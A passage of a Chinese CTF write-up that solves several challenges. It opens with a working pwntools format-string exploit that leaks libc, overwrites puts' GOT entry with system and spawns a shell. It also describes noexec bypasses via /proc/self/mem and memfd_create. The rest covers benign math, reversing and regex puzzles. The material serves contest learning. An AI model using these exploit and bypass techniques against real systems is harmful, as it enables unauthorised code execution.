<p>Flag2: 没做出来。赛后看了一下还是一道 printf 题。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exec_fmt</span>(<span class="params">payload</span>):</span><br><span class="line">    p = start()</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;(less than 0x20 characters)\n&#x27;</span>, <span class="string">b&#x27;123&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;capture it?:&#x27;</span>, payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;so you want to \n&#x27;</span>)</span><br><span class="line">    ret = p.recvline()</span><br><span class="line">    info(ret)</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">offset = autofmt.offset</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%21$p&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;this is your flag: &#x27;</span>)</span><br><span class="line">libc_leak_value = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">f&#x27;leaked libc at <span class="subst">&#123;<span class="built_in">hex</span>(libc_leak_value)&#125;</span>&#x27;</span>)</span><br><span class="line">libc.address = libc_leak_value + <span class="number">0x7ffff7c00000</span> - <span class="number">0x7ffff7c29d90</span></span><br><span class="line">info(<span class="string">f&#x27;libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://docs.pwntools.com/en/stable/fmtstr.html</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;capture it?:&#x27;</span>,</span><br><span class="line">                 fmtstr_payload(offset, &#123;exe.got[<span class="string">&#x27;puts&#x27;</span>]: libc.sym[<span class="string">&#x27;system&#x27;</span>]&#125;))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27; and your flag again? :&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="绝妙的多项式"><a class="markdownIt-Anchor" href="#绝妙的多项式"></a> 绝妙的多项式</h3>
<p>Flag1: 观察到题目需要我们解一个整数线性方程。 用 SymPy 求解即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Matrix</span><br><span class="line">b = &lt;期望输出，从 .rodata 中读出&gt;</span><br><span class="line">mod = <span class="number">998244353</span></span><br><span class="line">A = [ (i+<span class="number">1</span>) ** j % mod <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n) ]</span><br><span class="line">A = Matrix(n, n, A)</span><br><span class="line">Ai = A.inv_mod(mod)</span><br><span class="line">B = Matrix(n, <span class="number">1</span>, b)</span><br><span class="line">sol = Ai * B % mod</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, <span class="built_in">list</span>(sol.T)))</span><br></pre></td></tr></table></figure>
<p>Flag2: 观察到题目使用了一个 NTT 变换<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>。做一次逆变换即可得到答案。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">y</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(y)</span><br><span class="line">    rev = [<span class="number">0</span>] * length</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        rev[i] = rev[i &gt;&gt; <span class="number">1</span>] &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">            rev[i] |= length &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">if</span> i &lt; rev[i]:</span><br><span class="line">            y[i], y[rev[i]] = y[rev[i]], y[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">NTT</span>(<span class="params">a, inverse = <span class="literal">False</span></span>):</span><br><span class="line">    m = <span class="built_in">len</span>(a)</span><br><span class="line">    m2 = m</span><br><span class="line"></span><br><span class="line">    inv_p = inv(m)</span><br><span class="line">    <span class="keyword">if</span> inverse:</span><br><span class="line">        change(a)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> m2 &gt; <span class="number">1</span>:</span><br><span class="line">        m2 //= <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, m, <span class="number">2</span>*m2):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, m2):</span><br><span class="line">                p = i+j</span><br><span class="line">                q = i+j+m2</span><br><span class="line">                v5 = &lt;从 .rodata 中读出的常数&gt;[j+m2]</span><br><span class="line">                <span class="keyword">if</span> inverse:</span><br><span class="line">                    v5 = inv(v5)</span><br><span class="line">                P = a[p]</span><br><span class="line">                Q = a[q]</span><br><span class="line">                a[p] = (P+Q)%mod</span><br><span class="line">                a[q] = (P-Q+mod)*v5%mod</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> inverse:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            a[i] = a[i]*inv_p % mod</span><br><span class="line">        change(a)</span><br></pre></td></tr></table></figure>
<p>Flag3: 观察到题目使用 NTT 变换，实现了多项式的乘法 ployA x polyB = ployC。可以变换成一个线性方程，用 Z3 求解即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">flag3_len = <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">A = [Int(<span class="string">f&#x27;a_<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag3_len)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    s.add(And(A[i] &gt; <span class="number">32</span>, A[i] &lt; <span class="number">127</span>))</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">&#x27;flag&#123;&#x27;</span>):</span><br><span class="line">    s.add(A[i] == <span class="built_in">ord</span>(c))</span><br><span class="line">s.add(A[-<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">A_pad = [A[i] <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(A) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>)]</span><br><span class="line"></span><br><span class="line">B = [  &lt;从 .rodata 中读出的 ployB&gt;[i%<span class="number">0x22</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>)  ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    ss = []</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>):</span><br><span class="line">        b = i-a</span><br><span class="line">        ss.append(A_pad[a] * B[b])</span><br><span class="line">    ss = Sum(ss)</span><br><span class="line">    cont = ss == &lt;从 .rodata 中读出的 ployC&gt;[i]</span><br><span class="line">    s.add(cont)</span><br></pre></td></tr></table></figure>
<h3 id="禁止执行启动"><a class="markdownIt-Anchor" href="#禁止执行启动"></a> 禁止执行，启动</h3>
<p>题意，绕过文件系统的 <code>noexec</code> 选项。</p>
<p>Flag1: 用 LLDB 的 <code>expr __asm (...)</code> 执行汇编代码。也可以用 <code>p $rdi = 0</code> 设置寄存器，然后 <code>syscall</code>。</p>
<p>Flag2: 当时没做出来。需要利用 <code>/proc/&lt;pid&gt;/mem</code> 来读写<sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup>应用的内存（前提是有 ptrace 的权限<sup class="footnote-ref"><a href="#fn7" id="fnref7">[7]</a></sup>）。而且可以写任意只读部分<sup class="footnote-ref"><a href="#fn7" id="fnref7:1">[7:1]</a></sup>。内核对此有相关的安全考虑，称为 YAMA 特性<sup class="footnote-ref"><a href="#fn8" id="fnref8">[8]</a></sup>。在 <code>/proc/sys/kernel/yama/ptrace_scope</code> 可以看到默认的级别是 1 （restricted ptrace，默认只允许读写子进行的内存）。</p>
<p>这题的官方解答<sup class="footnote-ref"><a href="#fn9" id="fnref9">[9]</a></sup>用了一个有趣的技巧。问题是这样的，我们需要用一些工具（hexdump, dd, tail）对父进程的 mem 文件进行读写，但是这是违反 YAMA 规则的。解决的方法是，让父进程自己打开，然后把文件描述符传给子进程。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">exec</span> 3&lt;&gt;/proc/self/mem</span><br><span class="line">$ <span class="built_in">ls</span> /proc/self/fd/3 -al</span><br><span class="line">lrwx------ 1 linux linux 64 Oct 21 00:28 /proc/self/fd/3 -&gt; /proc/141090/mem</span><br><span class="line">$ <span class="built_in">dd</span> &lt;&amp;3</span><br><span class="line"><span class="built_in">dd</span>: error reading <span class="string">&#x27;standard input&#x27;</span>: Input/output error</span><br></pre></td></tr></table></figure>
<p>这题还有些很怪的地方，当我尝试把 <code>cat /bin/busybox</code> 保存下来时，不知道是哪一层的终端模拟器在 <code>0x0a</code> 前面加 <code>0x0d</code> 字节，导致导出的文件不能用。一个解决方法过一层 base64 编码。</p>
<p>另外，这个项目<sup class="footnote-ref"><a href="#fn10" id="fnref10">[10]</a></sup>对 mem 文件的有更加的探讨。</p>
<p>Flag3: 当时没做出来。用 <code>memfd_create()</code> 这个系统调用可以创建 rwx 的文件<sup class="footnote-ref"><a href="#fn11" id="fnref11">[11]</a></sup>。然后用符号链接构造好运行环境，这利用了 <code>noexec</code> 是按只据被链接到的对象决定进行判断的特点。</p>
<h2 id="algorithm"><a class="markdownIt-Anchor" href="#algorithm"></a> Algorithm</h2>
<h3 id="关键词过滤喵谢谢喵"><a class="markdownIt-Anchor" href="#关键词过滤喵谢谢喵"></a> 关键词过滤喵，谢谢喵</h3>
<p>Flag1: 把所有字符替换成字母a。把每1000个字母a替换成字母d，把每100个字母a替换成字母c，把每10个字母a替换成字母b。 输出的时候，把 abcd 字母的个数转成数字即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prog = [</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;[\n\r]&#x27;</span>, <span class="string">r&#x27;a&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;.&#x27;</span>, <span class="string">r&#x27;a&#x27;</span>),</span><br><span class="line"></span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;a&#123;1000&#125;&#x27;</span>, <span class="string">r&#x27;d&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;^&#x27;</span>, <span class="string">r&#x27;d&#x27;</span>),</span><br><span class="line"></span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;a&#123;100&#125;&#x27;</span>, <span class="string">r&#x27;c&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;(d+)&#x27;</span>, <span class="string">r&#x27;\1c&#x27;</span>),</span><br><span class="line"></span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;a&#123;10&#125;&#x27;</span>, <span class="string">r&#x27;b&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;(c+)&#x27;</span>, <span class="string">r&#x27;\1b&#x27;</span>),</span><br><span class="line"></span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;$&#x27;</span>, <span class="string">r&#x27;a&#x27;</span>),</span><br><span class="line"></span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;([abcd])\1&#123;9&#125;&#x27;</span>, <span class="string">r&#x27;9&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;([abcd])\1&#123;8&#125;&#x27;</span>, <span class="string">r&#x27;8&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;([abcd])\1&#123;7&#125;&#x27;</span>, <span class="string">r&#x27;7&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;([abcd])\1&#123;6&#125;&#x27;</span>, <span class="string">r&#x27;6&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;([abcd])\1&#123;5&#125;&#x27;</span>, <span class="string">r&#x27;5&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;([abcd])\1&#123;4&#125;&#x27;</span>, <span class="string">r&#x27;4&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;([abcd])\1&#123;3&#125;&#x27;</span>, <span class="string">r&#x27;3&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;([abcd])\1&#123;2&#125;&#x27;</span>, <span class="string">r&#x27;2&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;([abcd])\1&#123;1&#125;&#x27;</span>, <span class="string">r&#x27;1&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;([abcd])&#x27;</span>, <span class="string">r&#x27;0&#x27;</span>),</span><br><span class="line"></span><br><span class="line">    Replace(<span class="literal">True</span>, <span class="string">r&#x27;^0&#x27;</span>, <span class="string">r&#x27;&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;^$&#x27;</span>, <span class="string">r&#x27;0&#x27;</span>),</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<p>Flag2: 用一个特殊的字符分隔输入的字符串。然后不断判断相邻的两个字符串的长度是否满足降序的要求，如果不满足，则交换这两个字符串。不断的重复这个过程，直到无法替换就完成了字符串的排序。 这里有一个问题是如何比较字符串的长度呢？我把并把原来的字符串备份一份，用一个特殊字符来分隔原来的字符串和新的字符串，并把新的备份全部替换成字母a。这样，我们比较字符串长度的问题就变成了比较a的个数。 可以用 <code>(a*)a+分隔符\1</code> 这种形式来判断前面的字符串是否比后面的长。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prog = [</span><br><span class="line">    Replace(<span class="literal">True</span>, <span class="string">r&#x27;\n\n&#x27;</span>, <span class="string">r&#x27;\n&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;\n|$|^&#x27;</span>, <span class="string">r&#x27;⭕️&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">True</span>, <span class="string">r&#x27;⭕️([^⭕️👀]+)⭕️&#x27;</span>, <span class="string">r&#x27;⭕️\1👀\1⭕️&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">True</span>, <span class="string">r&#x27;⭕️([^⭕️👀]*)[^⭕️👀a]([^⭕️👀]*)👀([^⭕️👀]+)⭕️&#x27;</span>, <span class="string">r&#x27;⭕️\1a\2👀\3⭕️&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">True</span>, <span class="string">r&#x27;⭕️(a+)(a+)👀([^⭕️👀]+)⭕️\1👀([^⭕️👀]+)⭕️&#x27;</span>, <span class="string">r&#x27;⭕️\1👀\4⭕️\1\2👀\3⭕️&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;⭕️([^⭕️👀]*)👀([^⭕️👀]+)&#x27;</span>, <span class="string">r&#x27;\2\n&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;⭕️&#x27;</span>, <span class="string">r&#x27;&#x27;</span>),</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<p>Flag3: 用字符串表达 brainfuck 的状态机，状态机包括三个部分：代码（及代码游标），内存（及内存游标），输出。我们有很多可用的 emoji 字符来进行不同部分的分割和游标的表示。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">a, b</span>):</span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b,a-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        c = <span class="built_in">chr</span>(i) <span class="keyword">if</span> <span class="built_in">chr</span>(i) != <span class="string">&quot;\\&quot;</span> <span class="keyword">else</span> <span class="string">&quot;\\\\&quot;</span></span><br><span class="line">        ret.append(Replace(<span class="literal">False</span>, <span class="string">f&#x27;🏹(.*)✨(a&#123;&#123;<span class="subst">&#123;i&#125;</span>&#125;&#125;)🎃&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;c&#125;</span>🏹\\1✨\\2🎃&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">prog = [</span><br><span class="line">    <span class="comment"># Remove comments</span></span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;\n&#x27;</span>, <span class="string">r&#x27;&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;[^\[\].+-&lt;&gt;]&#x27;</span>, <span class="string">r&#x27;&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;\d&#x27;</span>, <span class="string">r&#x27;&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;[;:]&#x27;</span>, <span class="string">r&#x27;&#x27;</span>),</span><br><span class="line"></span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;^(.*)$&#x27;</span>, <span class="string">r&#x27;🎈\1🎠🏹✨🎃✨🎉&#x27;</span>),</span><br><span class="line"></span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈&#x27;</span>, <span class="string">&quot;Start2&quot;</span>),</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;Start&quot;</span>,</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;🎈(.)&#x27;</span>, <span class="string">r&quot;\1🎈&quot;</span>),</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;Start2&quot;</span>,</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈🎠&#x27;</span>, <span class="string">&quot;End&quot;</span>),</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈\+&#x27;</span>, <span class="string">&quot;OP+&quot;</span>),</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈-&#x27;</span>, <span class="string">&quot;OP-&quot;</span>),</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈&gt;&#x27;</span>, <span class="string">&quot;OP&gt;&quot;</span>),</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈&lt;&#x27;</span>, <span class="string">&quot;OP&lt;&quot;</span>),</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈\[&#x27;</span>, <span class="string">&quot;OP[&quot;</span>),</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈]&#x27;</span>, <span class="string">&quot;OP]&quot;</span>),</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈.&#x27;</span>, <span class="string">&quot;OP.&quot;</span>),</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;OP+&quot;</span>,</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;✨(a*)🎃&#x27;</span>, <span class="string">r&#x27;✨a\1🎃&#x27;</span>),</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈&#x27;</span>, <span class="string">&quot;Start&quot;</span>),</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;OP-&quot;</span>,</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;✨a(a*)🎃&#x27;</span>, <span class="string">r&#x27;✨\1🎃&#x27;</span>),</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈&#x27;</span>, <span class="string">&quot;Start&quot;</span>),</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;OP&gt;&quot;</span>,</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;🎃$&#x27;</span>, <span class="string">r&#x27;🎃✨🎉&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;✨(a*)🎃✨(a*)🎉&#x27;</span>, <span class="string">r&#x27;✨\1🎉✨\2🎃&#x27;</span>),</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈&#x27;</span>, <span class="string">&quot;Start&quot;</span>),</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;OP&lt;&quot;</span>,</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;🏹✨(a*)🎃&#x27;</span>, <span class="string">r&#x27;🏹✨🎉✨\1🎃&#x27;</span>),</span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;✨(a*)🎉✨(a*)🎃&#x27;</span>, <span class="string">r&#x27;✨\1🎃✨\2🎉&#x27;</span>),</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈&#x27;</span>, <span class="string">&quot;Start&quot;</span>),</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;OP[&quot;</span>,</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;✨a+🎃&#x27;</span>, <span class="string">&quot;Start&quot;</span>),</span><br><span class="line">    <span class="comment"># Jump past the matching ] if the cell at the pointer is 0</span></span><br><span class="line"></span><br><span class="line">        Replace(<span class="literal">False</span>, <span class="string">r&#x27;$&#x27;</span>, <span class="string">r&#x27;🎨&#x27;</span>),</span><br><span class="line">        <span class="string">&quot;OP[-dispatch&quot;</span>,</span><br><span class="line"></span><br><span class="line">        Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈\[&#x27;</span>, <span class="string">&quot;OP[-[&quot;</span>),</span><br><span class="line">        Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈]&#x27;</span>, <span class="string">&quot;OP[-]&quot;</span>),</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;OP[-other&quot;</span>,</span><br><span class="line"></span><br><span class="line">        Replace(<span class="literal">False</span>, <span class="string">r&#x27;🎈(.)&#x27;</span>, <span class="string">r&quot;\1🎈&quot;</span>),</span><br><span class="line">        Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈&#x27;</span>, <span class="string">&quot;OP[-dispatch&quot;</span>),</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;OP[-[&quot;</span>,</span><br><span class="line">        Replace(<span class="literal">False</span>, <span class="string">r&#x27;🎨(.*)$&#x27;</span>, <span class="string">r&#x27;🎨X\1&#x27;</span>),</span><br><span class="line">        Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈&#x27;</span>, <span class="string">&quot;OP[-other&quot;</span>),</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;OP[-]&quot;</span>,</span><br><span class="line">        Replace(<span class="literal">False</span>, <span class="string">r&#x27;🎨X(.*)$&#x27;</span>, <span class="string">r&#x27;🎨\1&#x27;</span>),</span><br><span class="line">        Replace(<span class="literal">False</span>, <span class="string">r&#x27;🎨$&#x27;</span>, <span class="string">r&#x27;&#x27;</span>),</span><br><span class="line">        Branch(<span class="literal">True</span>, <span class="string">r&#x27;🎨&#x27;</span>, <span class="string">&quot;Start&quot;</span>),</span><br><span class="line">        Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈&#x27;</span>, <span class="string">&quot;OP[-other&quot;</span>),</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;OP]&quot;</span>,</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;✨🎃&#x27;</span>, <span class="string">&quot;Start&quot;</span>),</span><br><span class="line">    <span class="comment"># Jump back to the matching [ if the cell at the pointer is nonzero</span></span><br><span class="line"></span><br><span class="line">        Replace(<span class="literal">False</span>, <span class="string">r&#x27;$&#x27;</span>, <span class="string">r&#x27;🎨&#x27;</span>),</span><br><span class="line">        <span class="string">&quot;OP]-dispatch&quot;</span>,</span><br><span class="line"></span><br><span class="line">        Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈\[&#x27;</span>, <span class="string">&quot;OP]-[&quot;</span>),</span><br><span class="line">        Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈]&#x27;</span>, <span class="string">&quot;OP]-]&quot;</span>),</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;OP]-other&quot;</span>,</span><br><span class="line"></span><br><span class="line">        Replace(<span class="literal">False</span>, <span class="string">r&#x27;(.)🎈&#x27;</span>, <span class="string">r&quot;🎈\1&quot;</span>),</span><br><span class="line">        Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈&#x27;</span>, <span class="string">&quot;OP]-dispatch&quot;</span>),</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;OP]-]&quot;</span>,</span><br><span class="line">        Replace(<span class="literal">False</span>, <span class="string">r&#x27;🎨(.*)$&#x27;</span>, <span class="string">r&#x27;🎨X\1&#x27;</span>),</span><br><span class="line">        Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈&#x27;</span>, <span class="string">&quot;OP]-other&quot;</span>),</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;OP]-[&quot;</span>,</span><br><span class="line">        Replace(<span class="literal">False</span>, <span class="string">r&#x27;🎨X(.*)$&#x27;</span>, <span class="string">r&#x27;🎨\1&#x27;</span>),</span><br><span class="line">        Replace(<span class="literal">False</span>, <span class="string">r&#x27;🎨$&#x27;</span>, <span class="string">r&#x27;&#x27;</span>),</span><br><span class="line">        Branch(<span class="literal">True</span>, <span class="string">r&#x27;🎨&#x27;</span>, <span class="string">&quot;Start&quot;</span>),</span><br><span class="line">        Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈&#x27;</span>, <span class="string">&quot;OP]-other&quot;</span>),</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;OP.&quot;</span>,</span><br><span class="line">] + gen(<span class="number">32</span>,<span class="number">122</span>) + [</span><br><span class="line">    Branch(<span class="literal">False</span>, <span class="string">r&#x27;🎈&#x27;</span>, <span class="string">&quot;Start&quot;</span>),</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;End&quot;</span>,</span><br><span class="line">    <span class="comment"># Replace(False, r&#x27;🎠&#x27;, r&#x27;\1&#x27;),</span></span><br><span class="line">    Replace(<span class="literal">False</span>, <span class="string">r&#x27;^.*🎠(.*)🏹.*$&#x27;</span>, <span class="string">r&#x27;\1&#x27;</span>),</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<h3 id="未来磁盘"><a class="markdownIt-Anchor" href="#未来磁盘"></a> 未来磁盘</h3>
<p>为了方便表述，做以下记号约定：f0 是完全未被压缩的包含 flag 的文件，f1 是压缩 f0 得到的文件，f2 是压缩 f1 得到的文件。这个问题的关键是要了解 gzip 的算法，需要阅读 RFC 1951 和 1952。</p>
<p>Flag1:  解压出 f1 文件，大小约 8 GiB。修改<a target="_blank" rel="noopener" href="https://github.com/emmanuel-marty/em_inflate">标准的解压算法</a>使其只输出 alphabet （术语来自 RFC），不输出 &lt;length, backward distance&gt; 即可。运行修改后的算法即可得到 flag。</p>
<p>Flag2:  解压出 f2 文件，大小约 40 GiB。观察到文件中有很如同 &lt;258, 16433&gt;, &lt;258, 1&gt;, &lt;258, 1&gt;, …, &lt;258, 1&gt;，&lt;238或239, 1&gt; 的模式（这里 &lt;a,b&gt; 表示 &lt;length, backward distance&gt;），每一个模式对应 f1 中的一个 compressed block。我们修改标准的解压算法，找到第一个不遵循这个模式的 compressed block，然后用 flag1 的方法解压这个 block 即可得到 flag2。</p>
<h3 id="扫雷iii"><a class="markdownIt-Anchor" href="#扫雷iii"></a> 扫雷III</h3>
<p>没做出来。简单看了一下解答，很有趣，是用扫雷构造的电路。Matrix67 写过一篇有趣的文章<sup class="footnote-ref"><a href="#fn12" id="fnref12">[12]</a></sup>。最早的研究应该是这篇学术文章<sup class="footnote-ref"><a href="#fn13" id="fnref13">[13]</a></sup>。</p>
<h3 id="小章鱼的曲奇"><a class="markdownIt-Anchor" href="#小章鱼的曲奇"></a> 小章鱼的曲奇</h3>
<p>Flag1: 调用<a target="_blank" rel="noopener" href="https://github.com/kmyk/mersenne-twister-predictor">mersenne-twister-predictor</a>。</p>
<p>Flag2: 阅读 cpython 的代码可知，种子是会被取绝对值的。因此直接令 seed2 = - seed1。</p>
<p>Flag3: 好像出题人疏忽了，直接重复输入种子即可。</p>
